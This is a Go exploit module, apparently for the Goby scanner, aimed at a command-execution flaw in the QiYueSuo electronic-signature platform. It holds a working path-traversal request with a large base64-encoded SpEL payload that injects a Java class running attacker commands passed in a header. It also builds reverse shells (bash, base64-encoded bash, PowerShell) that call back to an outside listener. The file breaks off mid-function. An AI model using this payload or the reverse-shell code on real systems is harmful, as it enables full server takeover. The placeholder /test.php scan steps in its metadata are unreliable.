package exploits

import (
	"encoding/base64"
	"errors"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"

	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "QiYueSuo /captcha/%2e%2e/template/html/add  Command Execution Vulnerability",
    "Description": "<p>QiYueSuo is a digital trusted basic service platform, which provides organizations with digital trusted basic solutions that integrate digital identity, electronic signature, seal control and data storage services.</p><p>The QiYueSuo /captcha/%2e%2e/template/html/add has a command execution vulnerability, through which an attacker can arbitrarily execute code on the server side, obtain server permissions, and then control the entire web server.</p>",
    "Product": "QiYueSuo-Electronic-Sign-Platform",
    "Homepage": "https://www.qiyuesuo.com/",
    "DisclosureDate": "2024-06-19",
    "PostTime": "2024-06-20",
    "Author": "Town",
    "FofaQuery": "title==\"电子签署平台管理后台\" || header=\"dn-staticdown.qbox.me static.geetest.com;img-src 'self' blob: data: http: *.qiyuesuo.com dn-staticdown.qbox.me static.geetest.com\" || banner=\"dn-staticdown.qbox.me static.geetest.com;img-src 'self' blob: data: http: *.qiyuesuo.com dn-staticdown.qbox.me static.geetest.com\"",
    "GobyQuery": "title==\"电子签署平台管理后台\" || header=\"dn-staticdown.qbox.me static.geetest.com;img-src 'self' blob: data: http: *.qiyuesuo.com dn-staticdown.qbox.me static.geetest.com\" || banner=\"dn-staticdown.qbox.me static.geetest.com;img-src 'self' blob: data: http: *.qiyuesuo.com dn-staticdown.qbox.me static.geetest.com\"",
    "Level": "3",
    "Impact": "<p>The QiYueSuo /captcha/%2e%2e/template/html/add has a command execution vulnerability, through which an attacker can arbitrarily execute code on the server side, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.qiyuesuo.com/\">https://www.qiyuesuo.com/</a></p><p>2. Set the access policy and whitelist access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBashBase64,ByBash",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "契约锁 /captcha/%2e%2e/template/html/add 命令执行漏洞",
            "Product": "契约锁-电子签署平台",
            "Description": "<p>契约锁是一款数字化可信基础服务平台，为组织提供“数字身份、电子签章、印章管控以及数据存证服务”于一体的数字化可信基础解决方案。<br></p><p>契约锁 /captcha/%2e%2e/template/html/add 存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，获取服务器权限，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.qiyuesuo.com/\">https://www.qiyuesuo.com/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>契约锁 /captcha/%2e%2e/template/html/add 存在命令执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "QiYueSuo /captcha/%2e%2e/template/html/add  Command Execution Vulnerability",
            "Product": "QiYueSuo-Electronic-Sign-Platform",
            "Description": "<p>QiYueSuo&nbsp;is a digital trusted basic service platform, which provides organizations with digital trusted basic solutions that integrate digital identity, electronic signature, seal control and data storage services.</p><p>The QiYueSuo&nbsp;/captcha/%2e%2e/template/html/add has a command execution vulnerability, through which an attacker can arbitrarily execute code on the server side, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. The official has not fixed the vulnerability for the time being. Please contact the manufacturer to fix the vulnerability: <a href=\"https://www.qiyuesuo.com/\">https://www.qiyuesuo.com/</a></p><p>2. Set the access policy and whitelist access through security devices such as firewalls.</p><p>3. If it is not necessary, public network access to the system is prohibited.</p>",
            "Impact": "<p>The QiYueSuo /captcha/%2e%2e/template/html/add has a command execution vulnerability, through which an attacker can arbitrarily execute code on the server side, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10962"
}`

	/*
	  "ExpParams": [
	    {
	      "name": "attackType",
	      "type": "select",
	      "value": "cmd,reverse",
	      "show": ""
	    },
	    {
	      "name": "cmd",
	      "type": "input",
	      "value": "whoami",
	      "show": "attackType=cmd"
	    },
	    {
	      "name": "reverse",
	      "type": "select",
	      "value": "ByBashBase64,ByPowershellBase64,ByBash,ByPowershell,BySh,ByNcBsd",
	      "show": "attackType=reverse"
	    }
	  ],
	*/

	setPayloadRequestHash0001 := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		payloadConfig := httpclient.NewPostRequestConfig("/login/%2e%2e/template/html/add")
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false
		payloadConfig.Header.Store("Content-Type", "application/json")
		payloadConfig.Header.Store("X-State", command)
		payloadConfig.Data = `{"file": "1", "title": "2", "params": [{"extensionParam": "{\"expression\":\"var a=new org.springframework.expression.spel.standard.SpelExpressionParser();var b='VCAob3JnLnNwcmluZ2ZyYW1ld29yay5jZ2xpYi5jb3JlLlJlZmxlY3RVdGlscykuZGVmaW5lQ2xhc3MoIlF5c1Rlc3QiLFQgKG9yZy5zcHJpbmdmcmFtZXdvcmsudXRpbC5CYXNlNjRVdGlscykuIGRlY29kZUZyb21TdHJpbmcoInl2NjZ2Z0FBQURJQktBb0FJUUNXQ0FDWENnQ1lBSmtLQUpnQW1nb0Ftd0NjQ0FDZENnQ2JBSjRIQUo4SUFLQUlBS0VJQUtJSUFLTUtBQjhBcEFvQXBRQ21DQUNuQ2dDWUFLZ0tBS1VBcVFjQWd3b0FtQUNxQ0FDckNnQXNBS3dLQUNFQXJRb0FId0NxQ0FDdUNnQWZBSzhLQUxBQXFnZ0FzUW9BTEFDeUNBQ3pDQUMwQndDMUNnQWZBTFlIQUxjS0FMZ0F1UWdBdWdjQXV3Z0F2QWdBdlFjQXZnb0FKd0MvQ2dBbkFNQUtBQ2NBd1FnQXdnY0F3d2dBeEFnQXhRa0F4Z0RIQ2dER0FNZ0lBTWtIQU1vSUFNc0lBTXdJQU0wS0FNNEF6d29BTEFEUUNBRFJDQURTQ0FEVENBRFVDQURWQndEV0NnRFhBTmdLQU5jQTJRb0EyZ0RiQ2dBOUFOd0lBTjBLQUQwQTNnb0FQUURmQndEZ0NnQkZBSllJQU9FS0FDd0E0Z29BUlFEakNBRGtDQURsQndEbUNnQk1BT2NJQU9nSEFPa0JBQVk4YVc1cGRENEJBQU1vS1ZZQkFBUkRiMlJsQVFBUFRHbHVaVTUxYldKbGNsUmhZbXhsQVFBU1RHOWpZV3hXWVhKcFlXSnNaVlJoWW14bEFRQUVkR2hwY3dFQUNVeFJlWE5VWlhOME93RUFDR1J2U1c1cVpXTjBBUUFVS0NsTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzQkFBVjJZWEl5T0FFQUlreHFZWFpoTDJ4aGJtY3ZRMnhoYzNOT2IzUkdiM1Z1WkVWNFkyVndkR2x2YmpzQkFBVjJZWEl5TmdFQUdVeHFZWFpoTDJ4aGJtY3ZjbVZtYkdWamRDOUdhV1ZzWkRzQkFBVjJZWEl5TndFQUlVeHFZWFpoTDJ4aGJtY3ZUbTlUZFdOb1RXVjBhRzlrUlhoalpYQjBhVzl1T3dFQUJYWmhjak14QVFBRmRtRnlNeklCQUJKTWFtRjJZUzlzWVc1bkwwOWlhbVZqZERzQkFBVjJZWEl6TXdFQUJYSmxjRzl1QVFBRGMzUnlBUUFTVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3QVFBRVkyMWtjd0VBRTF0TWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzQkFBbHlaWE4xYkhSVGRISUJBQVpsYm1OdlpHVUJBQVYyWVhJek1BRUFCWFpoY2pJNUFRQUJTUUVBQlhaaGNqSXhBUUFGZG1GeU1qSUJBQVYyWVhJeU13RUFCWFpoY2pJMEFRQUZkbUZ5TWpVQkFBVjJZWEkzT0FFQUZVeHFZWFpoTDNWMGFXd3ZRWEp5WVhsTWFYTjBPd0VBQlhaaGNqSXdBUUFGZG1GeU1Ua0JBQkpNYW1GMllTOXNZVzVuTDFSb2NtVmhaRHNCQUFWMllYSXhPQUVBQkhaaGNqZ0JBQVIyWVhJNUFRQVhUR3BoZG1FdmJHRnVaeTlEYkdGemMweHZZV1JsY2pzQkFBVjJZWEl4TUFFQUVVeHFZWFpoTDJ4aGJtY3ZRMnhoYzNNN0FRQUZkbUZ5TVRFQkFBVjJZWEl4TWdFQUJYWmhjakV6QVFBRmRtRnlNVFFCQUFWMllYSXhOUUVBQlhaaGNqRTJBUUFUVzB4cVlYWmhMMnhoYm1jdlZHaHlaV0ZrT3dFQUJYWmhjakUzQVFBQldnRUFGVXhxWVhaaEwyeGhibWN2UlhoalpYQjBhVzl1T3dFQUEyMXpad0VBRFZOMFlXTnJUV0Z3VkdGaWJHVUhBTU1IQU9vSEFPc0hBSjhIQUxVSEFPd0hBTGNIQUxzSEFMNEhBR2NIQU9ZQkFBcFRiM1Z5WTJWR2FXeGxBUUFNVVhselZHVnpkQzVxWVhaaERBQlFBRkVCQUFWemRHRnlkQWNBNmd3QTdRRHVEQUR2QVBBSEFPc01BUEVBOEFFQUhXOXlaeTVoY0dGamFHVXVZMjk1YjNSbExsSmxjWFZsYzNSSmJtWnZEQUR5QVBNQkFDQnFZWFpoTDJ4aGJtY3ZRMnhoYzNOT2IzUkdiM1Z1WkVWNFkyVndkR2x2YmdFQUVHcGhkbUV1YkdGdVp5NVVhSEpsWVdRQkFCVnFZWFpoTG14aGJtY3VWR2h5WldGa1IzSnZkWEFCQUNKdmNtY3VZWEJoWTJobExtTnZlVzkwWlM1U1pYRjFaWE4wUjNKdmRYQkpibVp2QVFBSGRHaHlaV0ZrY3d3QTlBRDFCd0RzREFEMkFQY0JBQVowWVhKblpYUU1BUGdBK1F3QStnRDdEQUQ4QUZnQkFBUm9kSFJ3REFEOUFQNE1BUDhCQUFFQUNVVnVaSEJ2YVc1MEpBd0JBUUVDQndFREFRQWFiM0puTG1Gd1lXTm9aUzUwYjIxallYUXVkWFJwYkM1dVpYUU1BUVFCQlFFQUJuUm9hWE1rTUFFQUNtZGxkRWhoYm1Sc1pYSUJBQTlxWVhaaEwyeGhibWN2UTJ4aGMzTU1BUVlCQndFQUVHcGhkbUV2YkdGdVp5OVBZbXBsWTNRSEFRZ01BUWtCQ2dFQUNXZGxkRWRzYjJKaGJBRUFIMnBoZG1FdmJHRnVaeTlPYjFOMVkyaE5aWFJvYjJSRmVHTmxjSFJwYjI0QkFBWm5iRzlpWVd3QkFBcHdjbTlqWlhOemIzSnpBUUFUYW1GMllTOTFkR2xzTDBGeWNtRjVUR2x6ZEF3QkN3RU1EQUVOQVE0TUFQb0JEd0VBRTJkbGRGZHZjbXRsY2xSb2NtVmhaRTVoYldVQkFCQnFZWFpoTDJ4aGJtY3ZVM1J5YVc1bkFRQURjbVZ4QVFBSFoyVjBUbTkwWlFjQkVBd0JFUUI4REFFU0FSTUJBQXRuWlhSU1pYTndiMjV6WlFFQUVsdE1hbUYyWVM5c1lXNW5MME5zWVhOek93RUFDV2RsZEVobFlXUmxjZ0VBQjFndFUzUmhkR1VCQUFkdmN5NXVZVzFsQndFVURBRVZBUllNQVJjQVdBRUFCbmRwYm1SdmR3RUFCMk50WkM1bGVHVUJBQUl2WXdFQUJ5OWlhVzR2YzJnQkFBSXRZd0VBRVdwaGRtRXZkWFJwYkM5VFkyRnVibVZ5QndFWURBRVpBUm9NQVJzQkhBY0JIUXdCSGdFZkRBQlFBU0FCQUFKY1FRd0JJUUVpREFFakFGZ0JBQlp6ZFc0dmJXbHpZeTlDUVZORk5qUkZibU52WkdWeUFRQUZWVlJHTFRnTUFTUUJKUXdBYVFFbUFRQUpZV1JrU0dWaFpHVnlBUUFIYzNWalkyVnpjd0VBRTJwaGRtRXZiR0Z1Wnk5RmVHTmxjSFJwYjI0TUFTY0FVUUVBQldWeWNtOXlBUUFIVVhselZHVnpkQUVBRUdwaGRtRXZiR0Z1Wnk5VWFISmxZV1FCQUJWcVlYWmhMMnhoYm1jdlEyeGhjM05NYjJGa1pYSUJBQmRxWVhaaEwyeGhibWN2Y21WbWJHVmpkQzlHYVdWc1pBRUFEV04xY25KbGJuUlVhSEpsWVdRQkFCUW9LVXhxWVhaaEwyeGhibWN2VkdoeVpXRmtPd0VBRldkbGRFTnZiblJsZUhSRGJHRnpjMHh2WVdSbGNnRUFHU2dwVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjMHh2WVdSbGNqc0JBQWxuWlhSUVlYSmxiblFCQUFsc2IyRmtRMnhoYzNNQkFDVW9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBUUFRWjJWMFJHVmpiR0Z5WldSR2FXVnNaQUVBTFNoTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OXlaV1pzWldOMEwwWnBaV3hrT3dFQURYTmxkRUZqWTJWemMybGliR1VCQUFRb1dpbFdBUUFPWjJWMFZHaHlaV0ZrUjNKdmRYQUJBQmtvS1V4cVlYWmhMMnhoYm1jdlZHaHlaV0ZrUjNKdmRYQTdBUUFEWjJWMEFRQW1LRXhxWVhaaEwyeGhibWN2VDJKcVpXTjBPeWxNYW1GMllTOXNZVzVuTDA5aWFtVmpkRHNCQUFkblpYUk9ZVzFsQVFBSVkyOXVkR0ZwYm5NQkFCc29UR3BoZG1FdmJHRnVaeTlEYUdGeVUyVnhkV1Z1WTJVN0tWb0JBQWhuWlhSRGJHRnpjd0VBRXlncFRHcGhkbUV2YkdGdVp5OURiR0Z6Y3pzQkFBcG5aWFJRWVdOcllXZGxBUUFWS0NsTWFtRjJZUzlzWVc1bkwxQmhZMnRoWjJVN0FRQVJhbUYyWVM5c1lXNW5MMUJoWTJ0aFoyVUJBQVpsY1hWaGJITUJBQlVvVEdwaGRtRXZiR0Z1Wnk5UFltcGxZM1E3S1ZvQkFBbG5aWFJOWlhSb2IyUUJBRUFvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3VzB4cVlYWmhMMnhoYm1jdlEyeGhjM003S1V4cVlYWmhMMnhoYm1jdmNtVm1iR1ZqZEM5TlpYUm9iMlE3QVFBWWFtRjJZUzlzWVc1bkwzSmxabXhsWTNRdlRXVjBhRzlrQVFBR2FXNTJiMnRsQVFBNUtFeHFZWFpoTDJ4aGJtY3ZUMkpxWldOME8xdE1hbUYyWVM5c1lXNW5MMDlpYW1WamREc3BUR3BoZG1FdmJHRnVaeTlQWW1wbFkzUTdBUUFGWTJ4dmJtVUJBQlFvS1V4cVlYWmhMMnhoYm1jdlQySnFaV04wT3dFQUJITnBlbVVCQUFNb0tVa0JBQlVvU1NsTWFtRjJZUzlzWVc1bkwwOWlhbVZqZERzQkFCRnFZWFpoTDJ4aGJtY3ZTVzUwWldkbGNnRUFCRlJaVUVVQkFBZDJZV3gxWlU5bUFRQVdLRWtwVEdwaGRtRXZiR0Z1Wnk5SmJuUmxaMlZ5T3dFQUVHcGhkbUV2YkdGdVp5OVRlWE4wWlcwQkFBdG5aWFJRY205d1pYSjBlUUVBSmloTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQUxkRzlNYjNkbGNrTmhjMlVCQUJGcVlYWmhMMnhoYm1jdlVuVnVkR2x0WlFFQUNtZGxkRkoxYm5ScGJXVUJBQlVvS1V4cVlYWmhMMnhoYm1jdlVuVnVkR2x0WlRzQkFBUmxlR1ZqQVFBb0tGdE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BUR3BoZG1FdmJHRnVaeTlRY205alpYTnpPd0VBRVdwaGRtRXZiR0Z1Wnk5UWNtOWpaWE56QVFBT1oyVjBTVzV3ZFhSVGRISmxZVzBCQUJjb0tVeHFZWFpoTDJsdkwwbHVjSFYwVTNSeVpXRnRPd0VBR0NoTWFtRjJZUzlwYnk5SmJuQjFkRk4wY21WaGJUc3BWZ0VBREhWelpVUmxiR2x0YVhSbGNnRUFKeWhNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNwVEdwaGRtRXZkWFJwYkM5VFkyRnVibVZ5T3dFQUJHNWxlSFFCQUFoblpYUkNlWFJsY3dFQUZpaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BXMElCQUJZb1cwSXBUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdBUUFQY0hKcGJuUlRkR0ZqYTFSeVlXTmxBQ0VBVHdBaEFBQUFBQUFDQUFFQVVBQlJBQUVBVWdBQUFDOEFBUUFCQUFBQUJTcTNBQUd4QUFBQUFnQlRBQUFBQmdBQkFBQUFDUUJVQUFBQURBQUJBQUFBQlFCVkFGWUFBQUFKQUZjQVdBQUJBRklBQUFjaUFBWUFJQUFBQXVrU0FrdTRBQU5NSzdZQUJMWUFCVTBzRWdhMkFBZFhwd0FKVGl1MkFBUk5MQklKdGdBSFRpd1NDcllBQnpvRUxCSUd0Z0FIT2dVc0VndTJBQWM2QmhrRUVneTJBQTA2QnhrSEJMWUFEaTBTRDdZQURUb0lHUWdFdGdBT0dRY3J0Z0FRdGdBUndBQVN3QUFTd0FBU3dBQVNPZ2tETmdvRE5nc1ZDeGtKdnFJQ1hCa0pGUXN5T2d3WkRNWUNTaGtNdGdBVEVoUzJBQldaQWowWkNCa010Z0FST2cwWkRjWUNMeGtOdGdBV3RnQVhFaGkyQUJXWkFoOFpEYllBRnJZQUdiWUFHaElidGdBY21RSU1HUTIyQUJZU0hiWUFEVG9PR1E0RXRnQU9HUTRaRGJZQUVUb1BHUSsyQUJZU0hnTzlBQisyQUNBWkR3TzlBQ0cyQUNJNkVBRTZFUmtRdGdBV0VpTUR2UUFmdGdBZ0dSQUR2UUFodGdBaU9oR25BQ0E2RWhrUXRnQVdFaVcyQUEwNkV4a1RCTFlBRGhrVEdSQzJBQkU2RVJrR0VpYTJBQTA2RWhrU0JMWUFEaGtTR1JHMkFCSEFBQ2M2RXhrVHRnQW93QUFuT2hRRE5oVVZGUmtVdGdBcG9nRmlHUlFWRmJZQUtqb1dHUmJHQVU0WkJSSXJBNzBBSDdZQUlCa1dBNzBBSWJZQUlzQUFMRG9YR1JmR0FUQVpGN2dBQTdZQUU3WUFISmtCSWhrRkVpMjJBQTA2R0JrWUJMWUFEaGtZR1JhMkFCRTZHUmtadGdBV0VpNEV2UUFmV1FPeUFDOVR0Z0FnR1JrRXZRQWhXUU1FdUFBd1U3WUFJam9hR1JxMkFCWVNNUU85QUIvQUFESzJBQ0FaR2dPOUFDRzJBQ0k2R3hrWnRnQVdFak1FdlFBZldRTVRBQ3hUdGdBZ0dSa0V2UUFoV1FNU05GTzJBQ0xBQUN3NkhCSTF1QUEydGdBM0VqaTJBQldaQUJrR3ZRQXNXUU1TT1ZOWkJCSTZVMWtGR1J4VHB3QVdCcjBBTEZrREVqdFRXUVFTUEZOWkJSa2NVem9kdXdBOVdiZ0FQaGtkdGdBL3RnQkF0d0JCRWtLMkFFTzJBRVE2SHJzQVJWbTNBRVlaSGhKSHRnQkl0Z0JKT2g4Wkc3WUFGaEpLQmIwQUgxa0RFd0FzVTFrRUV3QXNVN1lBSUJrYkJiMEFJVmtERWpSVFdRUVpIbE8yQUNKWEJEWUtwd0FKaEJVQnAvNmFGUXFaQUFhbkFBbUVDd0duL2FJU1MwdW5BQXRNSzdZQVRSSk9TeXF3QUFNQUR3QVdBQmtBQ0FFQkFSb0JIUUFrQUFNQzNBTGZBRXdBQXdCVEFBQUJBZ0JBQUFBQUN3QURBQTRBQndBUEFBOEFFZ0FXQUJVQUdRQVRBQm9BRkFBZkFCY0FKZ0FZQUM0QUdRQTJBQm9BUGdBYkFFY0FIQUJOQUIwQVZRQWVBRnNBSHdCeUFDQUFkUUFpQUlBQUl3Q0hBQ1FBbVFBbEFLSUFKZ0RLQUNjQTFnQW9BTndBS1FEbEFDb0EvZ0FyQVFFQUxnRWFBRE1CSFFBdkFSOEFNQUVyQURFQk1RQXlBVG9BTlFGREFEWUJTUUEzQVZVQU9BRmZBRG9CYkFBN0FYVUFQQUY2QUQwQmt3QStBYVlBUHdHdkFFQUJ0UUJCQWI0QVFnSGtBRU1DQUFCRkFpY0FTQUppQUVrQ2ZnQktBcEVBU3dLL0FFd0N3Z0JOQXNVQU9nTExBRklDMEFCVEF0TUFJZ0xaQUcwQzNBQnhBdDhBYmdMZ0FHOEM1QUJ3QXVjQWN3QlVBQUFCYWdBa0FCb0FCUUJaQUZvQUF3RXJBQThBV3dCY0FCTUJId0FiQUYwQVhnQVNBYThCRmdCZkFGd0FHQUcrQVFjQVlBQmhBQmtCNUFEaEFHSUFZUUFhQWdBQXhRQmpBR0VBR3dJbkFKNEFaQUJsQUJ3Q1lnQmpBR1lBWndBZEFuNEFSd0JvQUdVQUhnS1JBRFFBYVFCbEFCOEJrd0V5QUdvQVpRQVhBWFVCVUFCckFHRUFGZ0ZpQVdrQVdRQnNBQlVBMWdIOUFHMEFYQUFPQU9VQjdnQnVBR0VBRHdEK0FkVUFid0JoQUJBQkFRSFNBSEFBWVFBUkFVTUJrQUJ4QUZ3QUVnRlZBWDRBY2dCekFCTUJYd0YwQUYwQWN3QVVBS0lDTVFCMEFHRUFEUUNIQWt3QWRRQjJBQXdBZUFKaEFIY0FiQUFMQUFjQzFRQjRBSFlBQVFBUEFzMEFlUUI2QUFJQUpnSzJBSHNBZkFBREFDNENyZ0I5QUh3QUJBQTJBcVlBZmdCOEFBVUFQZ0tlQUg4QWZBQUdBRWNDbFFDQUFGd0FCd0JWQW9jQWdRQmNBQWdBY2dKcUFJSUFnd0FKQUhVQ1p3Q0VBSVVBQ2dMZ0FBY0Fld0NHQUFFQUF3TG1BSWNBWlFBQUFJZ0FBQUdYQUE3L0FCa0FBd2NBaVFjQWlnY0Fpd0FCQndDTUJmOEFXQUFNQndDSkJ3Q0tCd0NMQndDTkJ3Q05Cd0NOQndDTkJ3Q09Cd0NPQndBU0FRRUFBUDhBcEFBU0J3Q0pCd0NLQndDTEJ3Q05Cd0NOQndDTkJ3Q05Cd0NPQndDT0J3QVNBUUVIQUlvSEFJOEhBSTRIQUk4SEFJOEhBSThBQVFjQWtCei9BQ2NBRmdjQWlRY0FpZ2NBaXdjQWpRY0FqUWNBalFjQWpRY0FqZ2NBamdjQUVnRUJCd0NLQndDUEJ3Q09Cd0NQQndDUEJ3Q1BCd0NPQndDUkJ3Q1JBUUFBL3dEcUFCMEhBSWtIQUlvSEFJc0hBSTBIQUkwSEFJMEhBSTBIQUk0SEFJNEhBQklCQVFjQWlnY0Fqd2NBamdjQWp3Y0Fqd2NBandjQWpnY0FrUWNBa1FFSEFJOEhBSWtIQUk0SEFJOEhBSThIQUk4SEFJa0FBRklIQUpML0FHUUFGZ2NBaVFjQWlnY0Fpd2NBalFjQWpRY0FqUWNBalFjQWpnY0FqZ2NBRWdFQkJ3Q0tCd0NQQndDT0J3Q1BCd0NQQndDUEJ3Q09Cd0NSQndDUkFRQUErZ0FGL3dBSEFBd0hBSWtIQUlvSEFJc0hBSTBIQUkwSEFJMEhBSTBIQUk0SEFJNEhBQklCQVFBQStnQUYvd0FGQUFFSEFJa0FBUWNBa3djQUFRQ1VBQUFBQWdDViIpLG5ldyBqYXZheC5tYW5hZ2VtZW50LmxvYWRpbmcuTUxldChuZXcgamF2YS5uZXQuVVJMWzBdLFQgKGphdmEubGFuZy5UaHJlYWQpLmN1cnJlbnRUaHJlYWQoKS5nZXRDb250ZXh0Q2xhc3NMb2FkZXIoKSkpLmRvSW5qZWN0KCk=';var b64=java.util.Base64.getDecoder();var deStr=new java.lang.String(b64.decode(b),'UTF-8');var c=a['parseExpression'](deStr);c.getValue();\"}", "name": "3"}]}`
		resp, err := httpclient.DoHttpRequest(hostInfo, payloadConfig)
		if err != nil {
			return "", "", err
		}
		//command为原始命令，如果需编码，请自行编码后使用

		//漏洞url地址
		url := "/login/%2e%2e/template/html/add"

		//命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
		commandResult := resp.HeaderString.String()

		return commandResult, url, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash0001

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		//exp利用函数
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHash0001

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)
				re := regexp.MustCompile(`(?m)^X-State:\s*(\S+)`)
				matches := re.FindStringSubmatch(Result)
				if len(matches) > 1 {
					Result = matches[1]
				} else {
					Result = ""
				}

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
